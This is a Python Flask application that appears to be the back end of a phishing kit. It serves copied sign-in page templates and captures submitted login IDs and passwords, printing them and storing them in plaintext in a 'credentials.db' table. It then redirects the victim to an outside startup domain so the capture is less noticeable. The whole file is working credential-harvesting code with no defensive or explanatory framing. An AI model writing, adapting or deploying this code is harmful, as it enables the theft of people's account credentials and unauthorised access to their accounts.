# app.py
from flask import Flask, request, render_template, redirect, url_for, jsonify
import sqlite3
from datetime import datetime
import os
import mimetypes

DATABASE = "credentials.db"
app = Flask(__name__, template_folder="templates",static_folder="static")

mimetypes.add_type('image/svg+xml', '.svg')

def get_db_connection():
    conn = sqlite3.connect(DATABASE, timeout=10)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS logins (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            timestamp TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def save_login(username: str, password: str):
    conn = get_db_connection()
    c = conn.cursor()
    ts = datetime.utcnow().isoformat() + "Z"
    c.execute(
        "INSERT INTO logins (username, password, timestamp) VALUES (?, ?, ?)",
        (username, password, ts)
    )
    print(f"Successfully entered the credentials : {username,password}")
    conn.commit()
    conn.close()

@app.route("/", methods=["GET"])
def index():
    # Serve your unchanged templates/index.html
    return render_template("sign-in.html")

@app.route("/login-page")
def login_page():
    return render_template("login-page.html")

@app.route("/login", methods=["POST"])
@app.route("/submit", methods=["POST"])
def receive_credentials():
    form = request.form or {}
    data = (request.get_json() or {}) if request.is_json else {}

    # Prefer the page's field names
    email = (
        form.get("LOGINID") or form.get("LOGIN_ID") or
        data.get("LOGINID") or data.get("LOGIN_ID") or
        form.get("email") or data.get("email")
    )
    password = (form.get("PASSWORD") or form.get("password"))

    if not email:
        return jsonify({"ok": False, "error": "missing email"}), 400

    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent", "")

    print(email, password)
    save_login(email,password)

    return redirect("https://mystartup.centilytics.com", code=301)
    # return jsonify(str({"statuscode":200,"code":"SI200","signinathmode":{"loginid":email,"identifier":"1234567890","digest":"abc123","modes":{"allowedmodes":["password"]}}}))

@app.route("/next", methods=["GET"])
def next_route():
    return "Next route executed", 200

@app.route("/health", methods=["GET"])
def health():
    return {"status": "ok"}, 200

if __name__ == "__main__":
    # For local testing; bind to 127.0.0.1 if you don't want external access
    app.run(host="0.0.0.0", port=5100, debug=True)

